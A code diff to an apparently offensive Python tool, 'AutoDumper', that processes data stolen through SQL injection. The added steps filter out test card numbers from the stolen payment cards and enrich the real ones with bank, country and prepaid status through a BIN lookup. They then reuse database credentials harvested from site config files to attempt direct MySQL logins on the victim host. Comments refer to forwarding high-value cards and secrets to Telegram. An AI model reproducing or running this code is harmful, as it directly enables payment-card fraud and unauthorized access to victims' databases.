@@ -457,6 +457,47 @@ class AutoDumper:
         if self.key_validator and parsed.gateway_keys:
             await self._validate_keys(parsed, url, session)
         
+        # ── Step 5b: BIN Lookup for card data (v3.2) ──
+        if parsed.cards:
+            try:
+                from advanced_techniques import bin_lookup_api, is_real_card
+                verified_cards = []
+                for card_entry in parsed.cards:
+                    # Find card number in the entry
+                    card_num = ""
+                    for v in card_entry.values():
+                        s = re.sub(r'[\s\-]', '', str(v))
+                        if re.match(r'^[3-6]\d{12,18}$', s) and _luhn_check(s):
+                            card_num = s
+                            break
+                    if card_num:
+                        is_valid, network, reason = is_real_card(card_num)
+                        if not is_valid:
+                            logger.debug(f"[BIN] Rejected card {card_num[:6]}...: {reason}")
+                            continue
+                        card_entry["_network"] = network
+                        # Try API BIN lookup (rate-limited to avoid abuse)
+                        try:
+                            bin_info = await bin_lookup_api(card_num, session)
+                            if bin_info:
+                                card_entry["_bank"] = bin_info.get("bank", "")
+                                card_entry["_country"] = bin_info.get("country", "")
+                                card_entry["_card_type"] = bin_info.get("type", "")
+                                card_entry["_prepaid"] = bin_info.get("prepaid", False)
+                        except Exception:
+                            pass
+                    verified_cards.append(card_entry)
+                
+                rejected = len(parsed.cards) - len(verified_cards)
+                if rejected > 0:
+                    logger.info(f"[BIN] Verified {len(verified_cards)} cards, "
+                               f"rejected {rejected} (test/invalid)")
+                parsed.cards = verified_cards
+            except ImportError:
+                pass
+            except Exception as e:
+                logger.debug(f"[BIN] Lookup error: {e}")
+        
         # ── Step 6: Validate dump quality before generating files ──
         # Only proceed with file generation + Telegram if we found actual
         # high-value data (cards, keys, secrets). Prevents sending CSVs
@@ -497,6 +538,49 @@ class AutoDumper:
         # ── Step 9: Deeper table pass ──
         if dump_data.tables and sqli_result.injection_type == "union":
             await self._deeper_dump(sqli_result, dump_data, session, parsed)
+        
+        # ── Step 10: Config-cred → Port Exploiter handoff (v3.2) ──
+        db_creds = [
+            k for k in parsed.gateway_keys
+            if isinstance(k, dict) and k.get("type") == "db_credential"
+        ]
+        if db_creds:
+            try:
+                from port_exploiter import PortExploiter
+                domain = urlparse(url).netloc.split(":")[0]
+                exploiter = PortExploiter()
+                for cred in db_creds[:2]:  # Max 2 cred sets
+                    host = cred.get("db_host") or domain
+                    user = cred.get("db_user", "")
+                    passwd = cred.get("db_pass", "")
+                    db_name = cred.get("db_name", "")
+                    if user and passwd:
+                        logger.info(f"[ConfigCred→PortExploit] Trying {user}@{host} "
+                                   f"with creds from {cred.get('source_file', 'config')}")
+                        try:
+                            # Try MySQL (3306)
+                            result_mysql = await exploiter._exploit_mysql(
+                                host, 3306, session,
+                                override_user=user,
+                                override_pass=passwd,
+                                override_db=db_name,
+                            )
+                            if result_mysql and result_mysql.get("success"):
+                                logger.info(f"[ConfigCred→PortExploit] MySQL direct access SUCCESS!")
+                                parsed.gateway_keys.append({
+                                    "type": "direct_db_access",
+                                    "host": host,
+                                    "port": 3306,
+                                    "protocol": "mysql",
+                                    "user": user,
+                                    "source": "config_credential",
+                                })
+                        except Exception as e:
+                            logger.debug(f"[ConfigCred] MySQL exploit failed: {e}")
+            except ImportError:
+                logger.debug("[ConfigCred] port_exploiter not available")
+            except Exception as e:
+                logger.debug(f"[ConfigCred] Port exploit handoff error: {e}")
         
         logger.info(f"[AutoDump] Complete: {parsed.total_rows} rows, "
                     f"{len(parsed.cards)} cards, {len(parsed.credentials)} creds, "
